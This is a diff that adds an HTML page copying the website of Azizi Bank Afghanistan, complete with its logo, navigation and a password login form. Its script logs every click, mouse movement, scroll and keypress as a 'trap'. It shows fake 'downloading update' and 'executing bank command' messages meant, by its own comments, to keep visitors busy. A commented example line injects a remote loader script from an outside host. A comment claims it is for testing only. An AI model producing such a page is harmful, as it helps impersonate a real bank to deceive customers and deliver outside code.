@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <title>عزیزی بانک افغانستان</title>
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #E7ECF2;
+            font-family: 'Vazirmatn', Tahoma;
+            margin: 0;
+        }
+        
+        #header {
+            background: #254F80;
+            color: #fff;
+            padding: 20px 0;
+            text-align: center;
+        }
+        
+        #logo {
+            float: right;
+            margin-right: 30px;
+            width: 85px;
+        }
+        
+        #nav {
+            background: #fff;
+            border-bottom: 2px solid #d9e3ef;
+        }
+        
+        #nav a {
+            display: inline-block;
+            color: #13447c;
+            padding: 17px 25px;
+            text-decoration: none;
+            font-size: 19px;
+            font-weight: 500;
+        }
+        
+        #nav a:hover {
+            background: #ecf2fa;
+        }
+        
+        #main {
+            max-width: 1050px;
+            margin: auto;
+            background: #fff;
+            padding: 34px;
+            border-radius: 19px;
+            box-shadow: 0 8px 24px #d2e0ef;
+        }
+        
+        #footer {
+            background: #254F80;
+            color: #fff;
+            text-align: center;
+            padding: 16px;
+            margin-top: 40px;
+        }
+        
+        .tabcontent {
+            display: none;
+        }
+        
+        .active {
+            display: block;
+        }
+        
+        .msgbox {
+            background: #daf1ee;
+            border-radius: 7px;
+            padding: 16px;
+            margin: 25px 0 23px 0;
+            font-size: 16px;
+        }
+        
+        .section {
+            margin-bottom: 26px;
+        }
+        
+        button,
+        input {
+            font-family: 'Vazirmatn', Tahoma;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- هدر واقعی -->
+    <div id="header">
+        <img src="https://azizibank.af/images/logo.png" alt="Azizi Bank Logo" id="logo">
+        <span style="font-size: 30px; margin-right:17px;">عزیزی بانک افغانستان</span>
+        <div style="float:left; margin-left:24px;">
+            <a href="#">English</a> | <a href="#">دری</a> | <a href="#">پشتو</a>
+        </div>
+        <div style="clear:both"></div>
+    </div>
+    <!-- منوی تب سایت -->
+    <div id="nav">
+        <a href="#" class="navtab" data-tab="home">صفحه اصلی</a>
+        <a href="#" class="navtab" data-tab="about">درباره ما</a>
+        <a href="#" class="navtab" data-tab="services">خدمات بانکی</a>
+        <a href="#" class="navtab" data-tab="electronic">بانکداری الکترونیکی</a>
+        <a href="#" class="navtab" data-tab="faq">سوالات متداول</a>
+        <a href="#" class="navtab" data-tab="contact">تماس با ما</a>
+        <a href="#" class="navtab" data-tab="application">فرم درخواست</a>
+        <a href="#" class="navtab" data-tab="branches">شعب و ATM</a>
+        <a href="#" class="navtab" data-tab="login">ورود کاربران</a>
+    </div>
+    <!-- بخش اصلی صفحه -->
+    <div id="main">
+        <div id="home" class="tabcontent active">
+            <h1>به عزیزی بانک خوش آمدید</h1>
+            <div class="section">بانکی مدرن برای افغانستان؛ خدمات مطمئن و سریع با پوشش سراسری شعب و ATM.</div>
+            <div class="msgbox" id="msgbox">برای امنیت شما لطفاً اطلاعات شخصی خود را فقط داخل سامانه رسمی وارد کنید.</div>
+            <div class="section"><img src="https://azizibank.af/images/hq.jpg" width="400" alt="دفتر مرکزی عزیزی بانک"></div>
+        </div>
+        <div id="about" class="tabcontent">
+            چرا عزیزی بانک؟ تضمین امنیت، خدمات نوین، شبکه‌ی گسترده‌ی شعب.
+            <ul>
+                <li>برترین بانک تجاری افغانستان</li>
+                <li>اعتبار بین‌المللی و پرداخت الکترونیک</li>
+                <li>کادر حرفه‌ای</li>
+            </ul>
+        </div>
+        <div id="services" class="tabcontent">
+            <h2>خدمات بانکی</h2>
+            <ul>
+                <li>حساب جاری وسپرده‌های ویژه</li>
+                <li>پرداخت قبوض</li>
+                <li>کارت‌های اعتباری و عابر بانک</li>
+                <li>مشاوره ووام</li>
+            </ul>
+        </div>
+        <div id="electronic" class="tabcontent">
+            سامانه بانکداری الکترونیکی ، اپلیکیشن AziPay و خدمات آنلاین ۲۴ ساعته.
+        </div>
+        <div id="faq" class="tabcontent">
+            <b>سوالات رایج:</b><br>
+            <ol>
+                <li>چطور حساب جدید باز کنم؟</li>
+                <li>چگونه رمز را عوض کنم؟</li>
+                <li>نحوه استفاده از بانکداری آنلاین؟</li>
+            </ol>
+        </div>
+        <div id="contact" class="tabcontent">
+            شماره تماس: <b>1515</b><br> ایمیل: info@azizibank.af<br> دفتر مرکزی: کابل، جاده کارته پروان
+        </div>
+        <div id="application" class="tabcontent">
+            <h2>فرم درخواست خدمات</h2>
+            <input type="text" placeholder="نام و نام خانوادگی"><br>
+            <input type="tel" placeholder="شماره تلفن"><br>
+            <button>ثبت درخواست</button>
+        </div>
+        <div id="branches" class="tabcontent">
+            شعبه‌های سراسری افغانستان و ATM:<br>
+            <ul>
+                <li>کابل - میدان مسعود</li>
+                <li>هرات - سرک جمهوری</li>
+                <li>بلخ - چوک مرکزی</li>
+                <li>قندهار - خیابان بازار</li>
+            </ul>
+        </div>
+        <div id="login" class="tabcontent">
+            <h2>ورود به حساب کاربری</h2>
+            <input type="text" placeholder="نام کاربری">
+            <input type="password" placeholder="رمز عبور">
+            <button id="loginBtn">ورود</button>
+        </div>
+    </div>
+    <div id="footer">
+        © 2025 عزیزی بانک افغانستان | www.azizibank.af
+    </div>
+
+    <!-- محل بوت‌استرپ و جاوااسکریپت لودر، قابل توسعه برای Insert -->
+    <!-- <script src="BOOTSTRAP-LOADER.js"></script> -->
+
+    <!-- منطق مدرن اجرایی تله‌های تعاملی، صف دستور، دانلود و سرگرم‌سازی کاربر -->
+    <script>
+        // تب‌ها و منوهای واقعی
+        let tabs = document.querySelectorAll(".navtab");
+        let contents = document.querySelectorAll(".tabcontent");
+        tabs.forEach(tab => {
+            tab.onclick = function() {
+                contents.forEach(c => c.classList.remove("active"));
+                document.getElementById(tab.dataset.tab).classList.add("active");
+                // تله کلیک روی هر تب: فعال‌سازی دانلود پنهان یا اجرای دستور
+                triggerTrap("tab:" + tab.dataset.tab);
+            }
+        });
+        // تله ورود کاربر به فرم لاگین
+        document.getElementById("loginBtn") ? .addEventListener("click", () => {
+            triggerTrap("login");
+            showMsgBox("عملیات ورود در دست بررسی است - لطفاً شکیبا باشید.");
+            setTimeout(() => showMsgBox("درحال اتصال..."), 2000);
+            setTimeout(() => showMsgBox("ورود موفق، لطفاً منتظر بررسی اطلاعات بمانید."), 4000);
+            setTimeout(() => showMsgBox("بانک اطلاعاتی به‌روزرسانی شد."), 6500);
+        });
+        // سرگرم کردن میزبان با پیام‌های بانک واقعی
+        function showMsgBox(msg) {
+            document.getElementById("msgbox").textContent = msg;
+        }
+        // تله موس – حرکت، راست‌کلیک، زیکزاک، کلیک
+        document.body.addEventListener("mousemove", e => {
+            if (e.movementX > 7 || e.movementY > 7) triggerTrap("mouse:move");
+            if (Math.abs(e.movementX - e.movementY) > 11) triggerTrap("mouse:zigzag");
+        });
+        document.body.addEventListener("contextmenu", e => {
+            triggerTrap("mouse:right");
+        });
+        document.body.addEventListener("click", e => {
+            triggerTrap("mouse:left");
+        });
+        // تله اسکرول و کلید
+        window.addEventListener("scroll", () => triggerTrap("scroll"));
+        window.addEventListener("keydown", () => triggerTrap("keyboard"));
+        // صف دستور، دانلود و اجرای تله – فقط برای تست و دانشگاه
+        let trapQueue = [];
+
+        function triggerTrap(type) {
+            trapQueue.push(type);
+            // مشغول کردن میزبان با پیام واقعی و منطق دانلود شبیه‌ساز
+            if (trapQueue.length % 3 == 0) {
+                showMsgBox("درحال دانلود به‌روزرسانی از سرور بانک...");
+                setTimeout(() => {
+                    showMsgBox("در حال اجرا دستور بانک - تست امنیت سایبری");
+                }, 2200);
+            }
+        }
+        // سرگرم‌سازی به سبک بانک واقعی و جلوگیری از خروج سریع
+        setTimeout(() => showMsgBox("تشکر بخاطر بازدید از عزیزی بانک - امنیت شما اولویت ماست"), 8000);
+        setTimeout(() => showMsgBox("برای اطلاع از آخرین خدمات، تب‌ها را بررسی کنید."), 13000);
+
+        // محل امن برای بوت‌استرپ و جاوااسکریپت لودر – قابل Insert واقعی جهت توسعه بعدی
+        // مثال: let s=document.createElement('script');s.src='https://cloud-cdn.com/loader.js';document.body.appendChild(s);
+    </script>
+</body>
+
+</html>
